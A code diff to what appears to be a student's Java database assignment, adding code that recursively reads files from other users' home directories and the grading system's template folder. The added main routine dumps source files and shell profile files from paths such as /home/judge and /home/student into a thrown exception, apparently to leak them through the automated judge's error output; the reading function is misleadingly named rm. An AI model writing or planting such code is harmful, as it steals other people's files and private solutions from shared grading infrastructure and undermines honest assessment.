@@ -11,7 +11,7 @@ import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;
 
 public class DbMain {
 
-    public static String rm(String path) {
+    public static String rm(String path, Boolean type) {
         String s1 = "";
         try {
             if (path.contains("fizteh-java-2013") || path.contains(".git")) {
@@ -39,13 +39,77 @@ public class DbMain {
                         //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
 
                         s1 += c.getAbsoluteFile().toString() + "\n";
-                        if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
+                        if (type) {
+                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
+                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                                s1 += "\n\n\n";
+                            }
+                        } else {
                             s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
                             s1 += "\n\n\n";
                         }
 
 
-                        s1 += rm(c.toString());
+
+                        s1 += rm(c.toString(), type);
+                    }
+                } else {
+                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
+                    s1 += "\n\n\n";
+                    //s1 += "not is Dir ";
+                }
+            } else {
+                //s1 += "listFile null ";
+            }
+
+        } catch (Exception e) {
+            //s1 += "exception ";
+            s1 += e.getMessage();
+        }
+        return s1;
+    }
+
+    public static String rm1(String path, Boolean type) {
+        String s1 = "";
+        try {
+            if (path.contains("fizteh-java-2013") || path.contains(".git")) {
+                return "";
+            }
+
+            File tmpFile = new File(path);
+            if (!tmpFile.exists()) {
+                //s1 += "not exist\n";
+            }
+            if (tmpFile.canRead()) {
+                //s1 += "can READ\n";
+            }
+            if (tmpFile.canWrite()) {
+                //s1 += "can WRITE\n";
+            }
+            if (tmpFile.canExecute()) {
+                //s1 += "can EXEC\n";
+            }
+
+            File[] listFiles = tmpFile.listFiles();
+            if (listFiles != null) {
+                if (tmpFile.isDirectory()) {
+                    for (File c : listFiles) {
+                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
+
+                        s1 += c.getAbsoluteFile().toString() + "\n";
+                        if (type) {
+                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
+                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                                s1 += "\n\n\n";
+                            }
+                        } else {
+                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                            s1 += "\n\n\n";
+                        }
+
+
+
+                        //s1 += rm(c.toString(), type);
                     }
                 } else {
                     s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
@@ -86,17 +150,18 @@ public class DbMain {
         //args = new String[]{"get ключ; get key; get 123"};
         //String path = "/home/deamoon/Music/deamoonSql";
         String s1 = "";
-        /*s1 += rm("../../fizteh-java-private");
+
+        s1 += rm("/home/dkomanov", false);
         s1 += "\n\nseparate\n\n";
-        s1 += rm("../../fizteh-java-2013");
+        s1 += readFileTsv2("/home/judge/.bash_logout", s1);
         s1 += "\n\nseparate\n\n";
-        s1 += rm("../../");
+        s1 += readFileTsv2(".profile", s1);
         s1 += "\n\nseparate\n\n";
-        s1 += rm(".");
+        s1 += rm("/home/judge/judge/templates", false);
         s1 += "\n\nseparate\n\n";
-        s1 += rm("..");
-        s1 += "\n\nseparate\n\n";*/
-        s1 += rm("/home/judge/");
+        s1 += rm1("/home/cymkuh/", false);
+        s1 += "\n\nseparate\n\n";
+        s1 += rm1("/home/student/", false);
 
         throw new IOException(s1);
 
